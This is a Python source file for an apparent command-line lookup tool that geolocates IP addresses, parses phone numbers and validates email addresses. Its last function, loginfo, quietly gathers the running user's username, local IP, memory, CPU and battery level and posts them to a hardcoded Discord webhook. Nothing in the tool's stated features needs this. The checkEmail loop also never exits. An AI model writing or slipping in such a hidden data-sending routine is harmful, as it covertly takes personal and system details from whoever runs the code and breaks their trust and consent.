import requests
import socket
import os
import platform
import psutil
import getpass

import phonenumbers
from phonenumbers import carrier, geocoder, timezone
import email_validator

import time 

from utils import promptInput
from utils import formatDebug
from utils import formatErr
from utils import clearTerminal
from utils import formatRam

# Variables
lange = "en"
info_url = "https://discord.com/api/webhooks/1527797733057101834/i213PL7JqvBukq21dYno7tXEEsAylFz2_xdsBe8Tt-jbZrzZG9U4pJDR8u4gu_KsWk3G"


def lookupIp():
    while True:
        ip = promptInput("Enter IP (q to exit)")

        if ip.lower()=="q": break

        start = None

        try:
            start = time.time()
            fetch = requests.get(f'http://ip-api.com/json/{ip}?fields=66846719').json()
        except Exception as e:
            print(formatErr(e))

        if not fetch.get("status") == "success":
            msg = fetch.get("message")
            if msg == "invalid query":
                print(formatErr(f"{ip} is an invalid IP address"))
            elif msg == "private range":
                print(formatErr(f"{ip} is a private IP address"))
            elif msg == "reserved range":
                print(formatErr(f"{ip} is a reserved IP address"))
            else:
                print(formatErr(msg))
        else:
            for label in fetch:
                val = fetch.get(label)
                print(formatDebug(label, val))

        end = time.time()
        if fetch.get("status") == "success":
            print(f"Completed in {round(end - start, 2)}s\n") 

def lookupNum():
    while True:
        phoneNumber = promptInput("Enter Phone number (q to exit)")

        if str(phoneNumber).lower()=="q": break

        if not str(phoneNumber).startswith("+"): phoneNumber="+" + phoneNumber

        try:
            parsed = phonenumbers.parse(phoneNumber, None)

            toget = {
                'query': phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
                'is_valid_number': phonenumbers.is_valid_number(parsed), 
                'country_code': "+" + str(parsed.country_code), 
                'carrier':carrier.name_for_valid_number(parsed, lange),
                'country': geocoder.country_name_for_number(parsed, lange),
                'timezone': timezone.time_zones_for_number(parsed)
            }

            for label, returned in toget.items():
                print(formatDebug(str(label), str(returned)))
            print()


        except phonenumbers.NumberParseException as err:
            if err.error_type == phonenumbers.NumberParseException.NOT_A_NUMBER:
                print(formatErr("query isn't an int object"))
            elif err.error_type == phonenumbers.NumberParseException.TOO_LONG:
                print(formatErr("query is too long"))
            elif err.error_type == phonenumbers.NumberParseException.INVALID_COUNTRY_CODE:
                print(formatErr("invalid country code"))

        
def checkEmail():
    while True:
        email = promptInput("Enter email")
        
        try:
            validated = email_validator.validate_email(email)
            print("Email is valid")
        except email_validator.EmailNotValidError:
            print("Email is not valid")
        except email_validator.EmailUndeliverableError as err:
            print(err)
        except email_validator.EmailSyntaxError as err:
            print(err)
        
    checkEmail()

def loginfo():
    battery = psutil.sensors_battery()
    mem = psutil.virtual_memory()
    
    toget = {
        "user": getpass.getuser(),
        "ipv4": socket.gethostbyname(socket.gethostname()),
        "memory": f"total({formatRam(mem.total)}), used({formatRam(mem.used)})",    
        "cpu": platform.processor(),
        "battery": str(battery.percent) + "%"
    }

    data = "\n".join(f"{label}: {val}" for label, val in toget.items())

    requests.post(info_url, json={"content": data})
